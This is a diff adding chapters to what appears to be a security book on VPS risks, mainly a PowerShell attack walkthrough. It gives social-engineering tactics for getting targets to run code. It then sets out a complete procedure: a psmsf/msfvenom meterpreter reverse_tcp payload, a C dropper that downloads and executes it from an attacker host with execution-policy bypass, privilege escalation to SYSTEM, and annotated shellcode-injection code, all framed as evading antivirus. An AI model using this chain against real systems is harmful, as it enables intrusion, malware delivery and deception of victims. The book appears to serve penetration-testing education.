@@ -50,6 +50,12 @@ In terms of security, unless your provider is [Swiss](http://www.computerweekly.
 
 ### Windows {#vps-identify-risks-Windows}
 
+Windows exploitation is prevalent, easy and fun, because there is what seems to be a never ending source of security defects. I am not going to attempt to cover much, as I would be here for to long, and this book series is more focussed on giving you a broad understanding with examples as we go.
+
+The problem is not so much that there is a never ending source of defects in Windows, but rather, that the platform was not designed with openness as a core attribute. Because of its closed nature, hardening the platform in many cases is very difficult and often comes down to applying band-aids over top of the defects rather than being able to remove them.
+
+If you want a platform that you can have some control over the security of, do not buy into closed offerings.
+
 #### PsExec {#vps-identify-risks-psexec}
 ![](images/ThreatTags/average-common-difficult-severe.png)
 
@@ -213,9 +219,354 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
    
    Rather than relying on SMB via the psexec technique, starting a service on the target, the `wmi` module executes PowerShell on the target using the current user credentials or those that you supply, so this is still a PTH technique. We use the WMI Command-line (WMIC) to [start a Remote Procedure Call](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/wmic.rb#L48) on TCP port 135 and an ephemeral port. Then create a [ReverseListenerComm](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/wmi.rb#L61) to tunnel traffic through that session.
 
+#### PowerShell {#vps-identify-risks-PowerShell}
+
+[By default](https://blogs.msdn.microsoft.com/powershell/2008/10/28/powershell-will-be-installed-by-default-on-windows-server-08-r2-ws08r2-and-windows-7-w7/), PowerShell is installed on Windows Server 2008 R2 and Windows 7 onwards.
+
+PowerShell "_is going to be on all boxes and it going provide access to everything on the box_" Excellent news for penetration testers and other attackers!
+
+On Windows Server from PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2), the default execution policy is RemoteSigned, but that is easily overridden in a script as you will see soon. We:
+
+* Have full direct access to the Win32 API
+* Have full access to the .Net framework
+* Can assemble malicious shell code in memory without AV detection
+
+Then you just need to get some code run on your targets machine. There are many ways to achieve this. Off the top of my head:
+
+* Find someone that your target trusts and become (pretext) them, services like LinkedIn are good for this, as that will generally allow you to piece the organisations structure together with freely available OSINT that will not ring any alarm bells. It is pretty easy to build a decent replica of the organisations trust structure this way. Then you will have implicit trust. They will run your code or open your office document
+* Just befriend your target or someone close enough to your target inside the target organisation, have them run your code once they trust you. Then traverse once you have persistence on a machine
+* Find someone that usually sends files or links to files via email or similar and spoof the from address as discussed in the People chapter.
+* CD, DVD, USB stick drops, etc.
+* Using existing credentials you obtained by any of the means detailed in the People chapter and maybe logging into Outlook Web Access (OWA) or similar. Most people still use the same or similar passwords for multiple accounts. You only need one of them from someone on the targets network.
+
+Metasploit or Set generating office files or pdfs usually trigger AV, but this is much easier to get around with PowerShell.
+
+Traditionally the payload would have to be saved to the targets file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with HIDS/HIPS. AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts, as it is so easy to make changes to the script, but keep the script intent doing the same thing. To make matters worse, PowerShell is tightly integrated now with the Windows Operating Systems and with all the power of the .NET framework.
+
+So what we are doing is making our viruses and payloads look like chameleons or business as usual (BAU), to detection mechanisms.
+
+
+1. binary executable virus
+2. PowerShell command in office doc virus
+3. Generate-Macro.ps1
+  * Several types of persistence 
+  * Payload can be windows/meterpreter/reverse_http(s) unless you modify the script
+  * Invoke-Shellcode.ps1 is downloaded on each run and used to run the payload
+4. Out-Word.ps1 adds reboot persistence?
+  allows to create duplicate office file, but one with the macro.
+  * Payload can be downloaded from anywhere, there is a collection of existing PS payloads
+  * Decodes shellcode and runs, doesn't need Invoke-Shellcode.ps1
+
+
+
+
+
+
+
+
+
+
+
+
+
+![](images/HandsOnHack.png)
+
+
+
+You can find the video of how it is played out at []().
+
+I> ## Synopsis
+I>
+I> We will be using a reverse shell 
+I> Virus
+I> Payload
+I>
+I> Listener is listening
+I> Payload copied to hosting directory and web server started
+I> Create and compile virus.
+I> Target: Run virus
+I> Attacker collects reverse shell
+
+If you do not already have psmsf on your attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
+
+{icon=bomb}
+G> ## The Play
+G>
+G> Go ahead and run it, you will be provided with the details you need to take the next steps.
+G>
+G> Next we run:  
+G> `/opt/psmsf$ python psmsf --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost <listener-attack-ip> --lport 4444'
+G>
+G> If you do not specify an output directory for the attack files that psmsf creates, it will create the `powershell_attack` directory in your current directory, then generate the PowerShell attack files for us within it. The PowerShell attack files are:  
+G> 1. `powershell_msf.rc` (the resource file we can feed to `msfconsole`)
+G> 2. `powershell_hacking.bat` (the PowerShell shellcode payload)
+G>
+G> Start your listener using the `powershell_msf.rc` resource rile:  
+G> `msfconsole -r powershell_msf.rc'  
+G> or just load the same parameters from the resource file once you have msfconsole running, and follow with:  
+G> `exploit -j`:
+G>
+G> `msf exploit(handler) > exploit -j`  
+G> `[*] Exploit running as background job.`  
+G> `[*] Started reverse TCP handler on <listener-attack-ip>:4444`  
+G> `[*] Starting the payload handler...`  
+G> `msf exploit(handler) >`  
+G> `msf exploit(handler) >`
+G>
+G> The target now needs to run the payload `powershell_hacking.bat`. This can be run anywhere that PowerShell is available, and it will open a reverse meterpreter shell which is embedded within the `powershell_hacking.bat` payload to your listener. Some options:  
+G> * Copy paste the contents of the file into a Windows terminal
+G> * Run the file directly: `cmd.exe /c powershell_hacking.bat`
+G>
+G> Either of these two options are fine if you have access to the targets machine. If not, you will really need to conceal your true intent from the target that we have built a trust relationship with. We need to hide not only the payload (intent) contents, but also the code (virus) that fetches the payload and runs it (not yet discussed).
+G>
+G> OK, so let us host our payload:
+G>
+G> Copy `powershell_hacking.bat` so our target can unknowingly fetch and run it:  
+G> `/opt/psmsf/powershell_attack$ sudo cp powershell_hacking.bat /var/www/html/payload.txt`  
+G> Start our web server:  
+G> `Service apache2 start`  
+G> `curl <listener-attack-ip>/payload.txt or just browse the payload to verify that it is hosted.
+G>
+G> Now let us create our binary virus, we will write this in c. I am going to call this `download-payload-execute.c` because that is what it does. Obviously you would want to call it something that your target felt comfortable running. This is what it looks like:
+G>
+G> `#include<stdio.h>`  
+G> `#include<stdlib.h>`  
+G> `int main()`  
+G> `{`  
+G> `   // Once the following line has executed, we will have our shell.`  
+G> `   // system executes any command string you pass it.`  
+G> `   // Windows is happy with PowerShell of course.`  
+G> `   // noprofile causes no profile scripts to be loaded up front.`  
+G> `   // Not sure if script execution is enabled on target system? No problem, just set executionpolicy to bypass for this session.`  
+G> `   // This tells PowerShell to just trust that you know what you are doing, and that we are happy to download and run a malicious payload.`  
+G> `   // Invoke the EXpression: download the payload and execute it.`  
+G> `   // Providing the payload does not trigger anti virus, this should not.`
+G> `   system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");`
+G>
+G> `   // Add content here to make your target think this is a legitimate helpful tool.`  
+G> `   // Or just do nothing and you may have to explain to your target that it is broken.`  
+G>
+G> `   // Add the following if you want the terminal to stay open.`  
+G> `   //char buff[10];`  
+G> `   //fgets (buff, sizeof(buff), stdin);`  
+G> `}`
+G>
+G> With this, neither the payload or the virus should trigger Anti-Virus.
+G>
+G> Now you will need a c compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, so you should be good to compile the virus.
+G>
+G> `gcc download-payload-execute.c -o download-payload-execute.exe`
+G>
+G> This should provide you with an executable that AV will be happy about. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.
+G>
+G> Target runs payload:
+G>
+G> `[*] Encoded stage with x86/shikata_ga_nai`
+G> `[*] Sending encoded stage (958029 bytes) to <target-ip>`
+G> `[*] Meterpreter session 6 opened (<listener-attack-ip>:4444 -> <target-ip>:63814) at 2016-12-28 15:31:29 +1300`
+G> `msf exploit(handler) >`
+G>
+G> Now we have our shell. Type sessions to see its details:
+G>
+G> `msf exploit(handler) > sessions`
+G>
+G> `Active sessions`  
+G> `===============`  
+G>
+G> `  Id  Type                     Information              Connection`  
+G> `  --  ----                     -----------              ----------`  
+G `  6  meterpreter x86/windows  <target-host>\kim @ <target-host>  <listener-attack-ip>:4444 -> <target-ip>:63814 (<target-ip>)`
+G>
+G> To interact with your shell:
+G>
+G> `msf exploit(handler) > sessions -i 6`  
+G> `[*] Starting interaction with 6...`
+G>
+G> `meterpreter >`
+G>
+G> Check to see which user you are running with, this will be the user that ran the virus. If you convinced your target to run as admin, then you will be able to elevate your privileges very easily, otherwise you will have to try one of the other seemingly infinite techniques.
+G>
+G> `meterpreter > getuid`  
+G> `Server username: <target-host>\kim`
+G>
+G> `meterpreter > pwd`  
+G> `C:\Users\kim\Desktop`
+G>
+G> Check which extensions we have loaded:
+G>
+G> `meterpreter > use -l`  
+G> `espia`  
+G> `extapi`  
+G> `incognito`  
+G> `kiwi`  
+G> `lanattacks`  
+G> `mimikatz`  
+G> `powershell`  
+G> `priv`  
+G> `python`  
+G> `sniffer`  
+G> `stdapi`  
+G> `winpmem`
+G>
+G> If `priv` was not in the list, try load it with `use priv`.  
+G> Let us try for system, if this is not successful, try running `run bypassuac` first:
+G>
+G> `meterpreter > getsystem -h`  
+G> `Usage: getsystem [options]`
+G>
+G> `Attempt to elevate your privilege to that of local system.`
+G>
+G> `OPTIONS:`
+G>
+G> `  -h        Help Banner.`  
+G> `  -t <opt>  The technique to use. (Default to '0').`  
+G> `    0 : All techniques available`  
+G> `    1 : Named Pipe Impersonation (In Memory/Admin)`  
+G> `    2 : Named Pipe Impersonation (Dropper/Admin)`  
+G> `    3 : Token Duplication (In Memory/Admin)`
+G>
+G> `meterpreter > getsystem`  
+G> `...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).`  
+G>
+G> `meterpreter > getuid`  
+G> `Server username: NT AUTHORITY\SYSTEM`
+G>
+G> And no issue with Anti-Virus at all.  
+G> That is the easy part done, now you would need to setup persistence, and start moving laterally through the network.
+G>
+G> `meterpreter > exit`  
+G> `[*] Shutting down Meterpreter...`
+G>
+G> `[*] <target-ip> - Meterpreter session 6 closed.  Reason: User exit`
+G>
+G> `msf exploit(handler) > jobs -l`
+G>
+G> `Jobs`  
+G> `====`
+G>
+G> `  Id  Name                    Payload                          Payload opts`  
+G> `  --  ----                    -------                          ------------`  
+G> `  6   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://<listener-attack-ip>:4444`
+G>
+G> `msf exploit(handler) > jobs -K`  
+G> `Stopping all jobs...`  
+G>
+G> `msf exploit(handler) > jobs -l`
+G>
+G> `Jobs`  
+G> `====`
+G>
+G> `No active jobs.`
+G>
+G> `ss -ant` Will confirm that we are not listening on `4444` any more.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+**PowerShell Payload creation details**
+
+When psmsf is run as per above  
+The Metasploit `windows/meterpreter/reverse_tcp` `shellcode` is generated by running msfvenom programmatically as the following:  
+
+{linenos=off, lang=bash}
+    msfvenom --payload windows/meterpreter/reverse_tcp LHOST=<listener-ip> LPORT=4444 StagerURILength=5 StagerVerifySSLCert=false --encoder x86/shikata_ga_nai --arch x86 --platform windows --smallest --format c
+    # msfvenom --help-formats # Lists all the formats available with description.
+    # msfvenom --list encoders # Lists all the encoders available with description.
+
+psmsf then takes the generated output and strips out the characters that don’t actually form part of the raw shellcode, like an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.
+
+psmsf then replaces any instances of `\x` with `0x`
+
+Psmsf then passes the cleaned up reverse_tcp shellcode to a function (`generate_powershell_script`) that embeds it into a PowerShell script that is going to become the main part of our payload.
+
+That code looks like the following, I have added the annotations to help you work out how it works:
+
+
+{title="psmsf", linenos=off, lang=python}
+    def generate_powershell_script(shellcode):
+       shellcode = (
+          # Assign a reference to the string that is the C# signature of the VirtualAlloc, CreateThread, and memset function... to $c.
+          # Assign a reference to the string that starts immediatly before $c and finishes at the end of the Start-sleep command... to S1.
+          "$1 = '$c = ''"
+          # Import the kernel32.dll that has the native VirtualAlloc function we later use to provide us with the starting position in memory to write our shellcode to.
+          "[DllImport(\"kernel32.dll\")]"
+          "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
+          "[DllImport(\"kernel32.dll\")]"
+          "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
+          "[DllImport(\"msvcrt.dll\")]"
+          "public static extern IntPtr memset(IntPtr dest, uint src, uint count);"
+          "'';"
+    
+          # Add a VirtualAlloc, CreateThread, and memset functions of the C# signatures we assigned to $c to the PowerShell session as static methods of a class that Add-Type is about to create on the fly.
+          # Add-Type uses Platform Invoke (P/Invoke) to call the VirtualAlloc, CreateThread, and memset functions as required from the kernel32.dll.
+          # The Name and namespace parameters are used to prefix the new type. passthru is used to create an object that represents the type which is then assigned to $w
+          "$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;"
+    
+          # Create Byte array and assign our prepped reverse_tcp shellcode.
+          "[Byte[]];[Byte[]]"
+          "$z = %s;"
+          "$g = 0x1000;"
+          "if ($z.Length -gt 0x1000){$g = $z.Length};"
+    
+          # Starting at the first virtual address in the space of the calling process (which will be a PowerShell instance),
+          # allocate 0x1000 bytes, set to zero, but only when a caller first accesses when we memset below,
+          # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx
+          # and enable execute, read-only, or read/write access (0x40) to the committed region of pages.
+          # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
+          # Essentially just allocate some (all permissions) memory at the start of PowerShell that is executing this
+          # and assign the base address of the allocated meory to $x.
+    
+          "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
+    
+          # Set the memory that $x points to (first 0x1000 bytes of the calling PowerShell instance) to the memory that $z points to (the (reverse shell) shellcode that msvenom gives us).
+          "for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"
+          # Create a thread to execute within the virtual address space of the calling PowerShell (which happens on the last line).
+          # The third parameter represents the starting address of the thread, the shellcode to be executed by the thread.
+          # Setting the fifth parameter to 0 declares that the thread should run immediately after creation, .
+          # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682453(v=vs.85).aspx
+          "$w::CreateThread(0,0,$x,0,0,0);"
+          # Start-sleep just provides some time for the shellcode (reverse shell) to execute.
+          "for (;;){Start-sleep 60};';"
+          # Notice the last single quote above? That is the end of the string that is assigned to $1.
+          # $e is assigned the base 64 encoded string that $1 references.
+          "$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"
+          "$2 = \"-enc \";"
+    
+          # Check if the current process is 64 bit (8 bytes), or something else (32 bit assumed),
+          # then Invoke EXpression (at specific 64 bit path or 32 bit) PowerShell with base64 encoded $e, which references the now base64 encoded string that is most of this script.
+    
+          "if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\syswow64\WindowsPowerShell\\v1.0\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}"
+          % shellcode
+       )
+    
+       return shellcode
+
+
+
+
+
+
+
+
+
+
+
+
 ### Unnecessary and Vulnerable Services 
 
-#### Overly Permissive File Permissions, Ownership and Lack of Segmentation {#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation}
+#### Overly Permissive File Permissions, Ownership and Lack of Segmentation {#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation}
 
 A lack of segmenting of a file system, according to what is the least amount of privilege any authorised parties require is often the precursor to **privilege escalation**.
 
@@ -238,7 +589,8 @@ If the target file that an attacker wants to swap for a trojanised version is wo
         `./upc.sh > upc.output`  
         
         
-    2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.
+    2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.  
+    Also check the [Additional Resources](#additional-resources-vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation) chapter for other similar tools for both Linux and Windows.
 2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying as restrictive as possible permissions to granular file system partitioning is so effective.
     1. The first and easiest command to run is:  
     `mount`  
@@ -2000,7 +2352,7 @@ Check the most recent login of all users, or of a given user. `lastlog` sources 
 `/var/log/lastlog`  
 `lastlog`
 
-#### Logging and Alerting {#vps-countermeasures-lack-of-visibility-logging-and-alerting}
+#### [Logging and Alerting](https://medium.com/starting-up-security/learning-from-a-year-of-security-breaches-ed036ea05d9b#41e1) {#vps-countermeasures-lack-of-visibility-logging-and-alerting}
 ![](images/ThreatTags/PreventionEASY.png)
 
 %% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.
